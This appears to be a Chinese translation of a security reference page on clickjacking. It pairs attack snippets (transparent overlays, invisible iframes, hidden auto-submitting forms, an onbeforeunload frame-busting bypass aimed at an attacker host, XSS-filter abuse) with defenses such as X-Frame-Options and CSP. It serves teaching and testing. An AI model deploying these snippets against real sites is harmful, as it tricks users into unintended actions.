[原文文档](README.en.md)

# 点击劫持

> 点击劫持是一种Web安全漏洞，恶意网站诱使用户点击与其感知不同的东西，可能导致用户在其不知情或未同意的情况下执行意外操作。用户被欺骗执行各种意外操作，例如在密码框中输入、点击"删除我的账户"按钮、点赞帖子、删除帖子、在博客上评论。换句话说，正规网站上的所有正常用户可以执行的操作都可以通过点击劫持来完成。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
    * [UI重绘](#ui重绘)
    * [隐形框架](#隐形框架)
    * [按钮/表单劫持](#按钮表单劫持)
    * [执行方法](#执行方法)
* [防护措施](#防护措施)
    * [实现X-Frame-Options头部](#实现x-frame-options头部)
    * [内容安全策略(CSP)](#内容安全策略csp)
    * [禁用JavaScript](#禁用javascript)
* [OnBeforeUnload事件](#onbeforeunload事件)
* [XSS过滤器](#xss过滤器)
    * [IE8 XSS过滤器](#ie8-xss过滤器)
    * [Chrome 4.0 XSSAuditor过滤器](#chrome-40-xssauditor过滤器)
* [挑战](#挑战)
* [实验室](#实验室)
* [参考资料](#参考资料)

## 工具

* [portswigger/burp](https://portswigger.net/burp)
* [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
* [machine1337/clickjack](https://github.com/machine1337/clickjack)

## 方法论

### UI重绘

UI重绘是一种点击劫持技术，攻击者在合法网站或应用程序之上覆盖透明UI元素。
透明UI元素包含对用户视觉隐藏的恶意内容或操作。通过操纵元素的透明度和定位，
攻击者可以诱使用户与隐藏内容交互，相信他们正在与可见界面交互。

* **UI重绘的工作原理：**
    * 覆盖透明元素：攻击者创建一个覆盖合法网站整个可见区域的透明HTML元素（通常是`<div>`）。此元素使用CSS属性如`opacity: 0;`变为透明。
    * 定位和分层：通过设置CSS属性如`position: absolute; top: 0; left: 0;`，透明元素被定位为覆盖整个视口。由于它是透明的，用户看不到它。
    * 误导用户交互：攻击者在透明容器内放置欺骗性元素，如假按钮、链接或表单。这些元素在点击时执行操作，但由于覆盖的透明UI元素，用户不知道它们的存在。
    * 用户交互：当用户与可见界面交互时，由于透明覆盖，他们不知不觉地与隐藏元素交互。这种交互可能导致意外操作或未经授权的操作。

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">点击我</a>
</div>
```

### 隐形框架

隐形框架是一种点击劫持技术，攻击者使用隐藏iframe欺骗用户不知不觉地与来自另一个网站的内容交互。
这些iframe通过将它们的尺寸设置为零（height: 0; width: 0;）并移除它们的边框（border: none;）而变为隐形。
这些隐形框架内的内容可能是恶意的，如网络钓鱼表单、恶意软件下载或任何其他有害操作。

* **隐形框架的工作原理：**
    * 隐藏IFrame创建：攻击者在网页中包含一个`<iframe>`元素，将其尺寸设置为零并移除其边框，使其对用户不可见。

      ```html
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
      ```

    * 加载恶意内容：iframe的src属性指向攻击者控制的恶意网站或资源。由于iframe是隐形，内容在没有用户知情的情况下静默加载。
    * 用户交互：攻击者在隐形iframe之上覆盖诱人的元素，使用户看起来在与可见界面交互。例如，攻击者可能在隐形iframe之上定位一个透明按钮。当用户点击按钮时，他们实际上是在点击iframe内的隐藏内容。
    * 意外操作：由于用户不知道隐形iframe，它们的交互可能导致意外操作，如提交表单、点击恶意链接，甚至在未经同意的情况下执行财务交易。

### 按钮/表单劫持

按钮/表单劫持是一种点击劫持技术，攻击者欺骗用户与隐形或隐藏按钮/表单交互，导致在合法网站上发生意外操作。通过在可见按钮或表单之上覆盖欺骗元素，攻击者可以操纵用户交互来执行恶意操作，而用户毫不知情。

* **按钮/表单劫持的工作原理：**
    * 可见界面：攻击者向用户显示可见按钮或表单，鼓励他们点击或与之交互。

    ```html
    <button onclick="submitForm()">点击我</button>
    ```

    * 隐形覆盖：攻击者用包含恶意操作的隐形或透明元素覆盖这个可见按钮或表单，如提交隐藏表单。

    ```html
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- 隐藏表单字段 -->
    </form>
    ```

    * 欺骗交互：当用户点击可见按钮时，由于隐形覆盖，他们不知不觉地与隐藏表单交互。表单被提交，可能导致未经授权的操作或数据泄露。

    ```html
    <button onclick="submitForm()">点击我</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- 隐藏表单字段 -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
    ```

### 执行方法

* 创建隐藏表单：攻击者创建包含恶意输入字段的隐藏表单，目标是受害者网站上的易受攻击的操作。此表单对用户保持隐形。

```html
  <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```

* 覆盖可见元素：攻击者在他们的恶意页面上覆盖可见元素（按钮或表单），鼓励用户与之交互。当用户点击可见元素时，他们不知不觉地触发隐藏表单的提交。

```js
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
```

## 防护措施

### 实现X-Frame-Options头部

使用DENY或SAMEORIGIN指令实现X-Frame-Options头部，防止您的网站在未经您同意的情况下被嵌入iframe内。

```apache
Header always append X-Frame-Options SAMEORIGIN
```

### 内容安全策略(CSP)

使用CSP控制可以从哪些源在您的网站上加载内容，包括脚本、样式和框架。
定义强CSP策略以防止未经授权的框架化和外部资源加载。
HTML meta标签中的示例：

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

### 禁用JavaScript

* 由于这些类型的客户端保护依赖于JavaScript框架破坏代码，如果受害者禁用JavaScript或攻击者能够禁用JavaScript代码，网页将没有针对点击劫持的任何保护机制。
* 有三种可用于框架的停用技术：
    * Internet Explorer的受限框架：从IE6开始，框架可以有"security"属性，如果设置为"restricted"值，确保JavaScript代码、ActiveX控件和重定向到其他站点在框架中不起作用。

    ```html
    <iframe src="http://target site" security="restricted"></iframe>
    ```

    * Sandbox属性：使用HTML5，有一个称为"sandbox"的新属性。它可以对加载到iframe中的内容启用一组限制。目前此属性仅与Chrome和Safari兼容。

    ```html
    <iframe src="http://target site" sandbox></iframe>
    ```

## OnBeforeUnload事件

* `onBeforeUnload`事件可用于规避框架破坏代码。当框架破坏代码想要通过在整页而不是仅在iframe中加载URL来销毁iframe时，调用此事件。处理程序函数返回一个字符串，提示用户询问是否确认要离开页面。当此字符串显示给用户时，很可能取消导航，击败目标的框架破坏尝试。

* 攻击者可以使用以下示例代码在顶部页面注册卸载事件来使用此攻击：

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " 您要离开fictitious.site吗?";
    }
</script>
<iframe src="http://target site">
```

* 前面的技术需要用户交互，但可以在不提示用户的情况下达到相同结果。为此，攻击者必须在onBeforeUnload事件处理程序中自动取消传入的导航请求，方法是一遍又一遍地提交（例如每毫秒一次）导航请求到响应为_"HTTP/1.1 204 No Content"_头部的网页。

204页面：

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

攻击者页面：

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

## XSS过滤器

### IE8 XSS过滤器

此过滤器对流经Web浏览器的每个请求和响应的所有参数都有可见性，并将它们与一组正则表达式进行比较，以查找反射的XSS尝试。当过滤器识别出可能的XSS攻击时；它禁用页面内的所有内联脚本，包括框架破坏脚本（外部脚本也可以做同样的事情）。因此，攻击者可以通过在请求参数中插入框架破坏脚本的开头来诱导假阳性。

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

攻击者视图：

```html
<iframe src="http://target site/?param=<script>if">
```

### Chrome 4.0 XSSAuditor过滤器

与IE8 XSS过滤器相比，它的行为略有不同，实际上使用此过滤器，攻击者可以通过在请求参数中传递其代码来停用"script"。这使框架页面能够专门针对包含框架破坏代码的单个片段，而让所有其他代码保持完好。

攻击者视图：

```html
<iframe src="http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
```

## 挑战

检查以下代码：

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">点击我</button>
```

确定此代码片段中的点击劫持漏洞。识别隐藏的iframe如何用于利用用户点击按钮时的操作，将他们引导至恶意网站。

## 实验室

* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
* [OWASP客户端点击劫持测试](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)

## 参考资料

* [Clickjacker.io - Saurabh Banawar - 2020年5月10日](https://clickjacker.io)
* [点击劫持 - Gustav Rydstedt - 2020年4月28日](https://owasp.org/www-community/attacks/Clickjacking)
* [Synopsys点击劫持 - BlackDuck - 2019年11月29日](https://www.synopsys.com/glossary/what-is-clickjacking.html#B)
* [Web-Security点击劫持 - PortSwigger - 2019年10月12日](https://portswigger.net/web-security/clickjacking)